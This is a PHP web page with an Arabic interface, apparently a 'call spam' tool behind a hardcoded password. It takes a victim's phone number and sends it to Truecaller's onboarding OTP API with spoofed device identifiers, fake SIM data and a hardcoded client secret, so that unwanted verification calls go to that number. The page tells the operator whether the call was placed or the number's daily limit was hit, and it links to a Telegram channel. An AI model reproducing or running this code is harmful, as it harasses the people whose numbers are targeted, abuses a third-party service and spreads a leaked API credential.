

<?php
    /* Your password */
    $password = '404A200OK';

    if (empty($_COOKIE['password']) || $_COOKIE['password'] !== $password) {
        // Password not set or incorrect. Send to login.php.
        header('Location: ../../');
        exit;
    }
?>


<?php
if(isset($_POST['submit'])){$number=$_POST['number'];
$gre = rand(1,9).rand(1,9).rand(1,1000);
$ig = md5($gre);
$id = substr($ig, 16);
$url = "https://account-asia-south1.truecaller.com/v3/sendOnboardingOtp";
$data = '{"countryCode":"eg","dialingCode":20,"installationDetails":{"app":{"buildVersion":8,"majorVersion":12,"minorVersion":34,"store":"GOOGLE_PLAY"},"device":{"deviceId":"'.$id.'","language":"ar","manufacturer":"Xiaomi","mobileServices":["GMS"],"model":"Redmi Note 8A Prime","osName":"Android","osVersion":"7.1.2","simSerials":["8920022021714943876f","8920022022805258505f"]},"language":"ar","sims":[{"imsi":"602022207634386","mcc":"602","mnc":"2","operator":"vodafone"},{"imsi":"602023133590849","mcc":"602","mnc":"2","operator":"vodafone"}],"storeVersion":{"buildVersion":8,"majorVersion":12,"minorVersion":34}},"phoneNumber":"'.$number.'","region":"region-2","sequenceNo":1}';
$headers = ['Host: account-asia-south1.truecaller.com',
    'content-type: application/json; charset\u003dUTF-8',
    'content-length: 680',
    'user-agent: Truecaller/12.34.8 (Android;8.1.2)',
    'clientsecret: lvc22mp3l1sfv6ujg83rd17btt'];
$start = curl_init();
curl_setopt($start,CURLOPT_URL, $url);
curl_setopt($start,CURLOPT_POST, true);
curl_setopt($start,CURLOPT_POSTFIELDS, $data);
curl_setopt($start,CURLOPT_RETURNTRANSFER, true);
curl_setopt($start, CURLOPT_HTTPHEADER,$headers);
$result = curl_exec($start);
$json2=json_decode($result,true);
$msg = $json2['message'];
if($msg == 'Sent'){
$message = '<div class="alert alert-success alert-dismissible text-white" role="alert"><span class="text-sm">تم ارسال المكالمة بنجاح</span><button type="button" class="btn-close text-lg py-3 opacity-10" data-bs-dismiss="alert" aria-label="Close"><span aria-hidden="true">×</span></button></div>';
}elseif($msg == 'Secret token pending'){
$message = '<div class="alert alert-danger alert-dismissible text-white" role="alert"><span class="text-sm">حاول مرة تانية بعد 30 ثانية</span><button type="button" class="btn-close text-lg py-3 opacity-10" data-bs-dismiss="alert" aria-label="Close"><span aria-hidden="true">×</span></button></div>';
}else{
$message = '<div class="alert alert-danger alert-dismissible text-white" role="alert"><span class="text-sm">تفذت محاولات ذالك الرقم لليوم</span><button type="button" class="btn-close text-lg py-3 opacity-10" data-bs-dismiss="alert" aria-label="Close"><span aria-hidden="true">×</span></button></div>';
}
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <link rel="apple-touch-icon" sizes="76x76" href="../../logo-ct.jpg">
  <link rel="icon" type="image/png" href="../../logo-ct.jpg">
  <title>
    سبام مكالمات
  </title>
  <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700,900|Roboto+Slab:400,700" />
  <link href="../../nucleo-icons.css" rel="stylesheet" />
  <link href="../../nucleo-svg.css" rel="stylesheet" />
  <script src="https://kit.fontawesome.com/6ed7f1438e.js" crossorigin="anonymous"></script>
  <link id="pagestyle" href="../../material-dashboard.css?v=3.0.0" rel="stylesheet" />
  <link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Markazi+Text&display=swap" rel="stylesheet">
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Almarai&display=swap');
    *{
      font-family: 'Almarai', sans-serif !important;
    }
    i {
      font-family: 'Font Awesome 5 Free' !important
    }
  </style>
</head>

<body class="g-sidenav-show rtl bg-gray-200">
  <aside class="sidenav navbar navbar-vertical navbar-expand-xs border-0 border-radius-xl my-3 fixed-end me-3 rotate-caret  bg-gradient-dark" id="sidenav-main">
    <div class="sidenav-header">
      <i class="fas fa-times p-3 cursor-pointer text-white opacity-5 position-absolute start-0 top-0 d-none d-xl-none" aria-hidden="true" id="iconSidenav"></i>
      <a class="navbar-brand m-0" href="" target="_blank">
        <img src="../../logo-ct.jpg" class="navbar-brand-img h-100" alt="main_logo">
        <span class="me-1 font-weight-bold text-white">تطوير ماجيكانو</span>
      </a>
    </div>
    <hr class="horizontal light mt-0 mb-2">
    <div class="collapse navbar-collapse px-0 w-auto  max-height-vh-100" id="sidenav-collapse-main">
      <ul class="navbar-nav">
        <li class="nav-item">
          <a class="nav-link" href="https://t.me/https_200ok/">
            <div class="text-white text-center ms-2 d-flex align-items-center justify-content-center">
              <i class="fa-solid fa-house"></i>
            </div>
            <span class="nav-link-text me-1">قناة التليجرام </span>
          </a>
        </li>
      </ul>
    </div>
    <div class="sidenav-footer position-absolute w-100 bottom-0 ">
      <div class="mx-3">
        <a class="btn bg-gradient-primary mt-4 w-100" href="https://bit.ly/3GLDSo7" target="_blank" type="button"> مطور الموقع</a>
      </div>
    </div>
  </aside>
  <main class="main-content position-relative max-height-vh-100 h-100 border-radius-lg overflow-x-hidden">
    <!-- Navbar -->
    <nav class="navbar navbar-main navbar-expand-lg px-0 mx-4 shadow-none border-radius-xl" id="navbarBlur" navbar-scroll="true">
      <div class="container-fluid py-1 px-3">
        <div class="collapse navbar-collapse mt-sm-0 mt-2 px-0" id="navbar">
          <ul class="navbar-nav me-auto ms-0 justify-content-end">
            <li class="nav-item d-xl-none pe-3 d-flex align-items-center">
              <a href="javascript:;" class="nav-link text-body p-0" id="iconNavbarSidenav">
                <div class="sidenav-toggler-inner">
                  <i class="sidenav-toggler-line"></i>
                  <i class="sidenav-toggler-line"></i>
                  <i class="sidenav-toggler-line"></i>
                </div>
              </a>
            </li>
          </ul>
        </div>
      </div>
    </nav>

    <div class="container-fluid px-2 px-md-4">
      <div class="page-header min-height-300 border-radius-xl mt-4" style="background-image: url('../../telegram.jpg');">
        <span style="background-image:none" class="mask  bg-gradient-primary  opacity-6"></span>
      </div>
      <div class="card card-body mx-3 mx-md-4 mt-n6">
        <div class="row gx-4 mb-2">
          <div class="col-auto">
            <div class="avatar avatar-xl position-relative">
              <img src="../../telegram-denger.jpg" alt="profile_image" class="w-100 border-radius-lg shadow-sm">
            </div>
          </div>
          <div class="col-auto my-auto">
            <div class="h-100">
              <h5 class="mb-1">سبام مكالمات جميع الشركات</h5>
              <p class="mb-0 font-weight-normal text-sm"></p>
            </div>
          </div>
          <div class="col-lg-4 col-md-6 my-sm-auto ms-sm-auto me-sm-0 mx-auto mt-3"></div>
        </div>
        <?php if(!empty($message)){ ?>
        <?php echo $message ?>
        <?php } ?>
        <div class="row">
            <div class="col-12 mt-4">
                <div class="row">
                    <div class="card-body">
                        <form method="POST" >
                            <input type="text" name="auth" hidden value="<?php echo $auth?>">
                            <div class="input-group input-group-outline mb-3">
                                <label class="form-label">رقم التليفون</label>
                                <input type="text" name="number" class="form-control">
                            </div>
                            <div class="text-center">
                                <button type="submit" name="submit" class="btn bg-gradient-primary w-100 my-4 mb-2">ارسال المكالمة</button>
                            </div>
                        </form>
                    </div>
                </div>
                
            </div>

        </div>
      </div>
    </div>
    <!-- End Navbar -->
    
  </main>
  
  <!--   Core JS Files   -->
  <script src="../../popper.min.js"></script>
  <script src="../../bootstrap.min.js"></script>
  <script src="../../perfect-scrollbar.min.js"></script>
  <script src="../../smooth-scrollbar.min.js"></script>
  <script src="../../chartjs.min.js"></script>
  <script>
    var win = navigator.platform.indexOf('Win') > -1;
    if (win && document.querySelector('#sidenav-scrollbar')) {
      var options = {
        damping: '0.5'
      }
      Scrollbar.init(document.querySelector('#sidenav-scrollbar'), options);
    }
  </script>
  <script src="../../material-dashboard.min.js?v=3.0.0"></script>
</body>

</html>
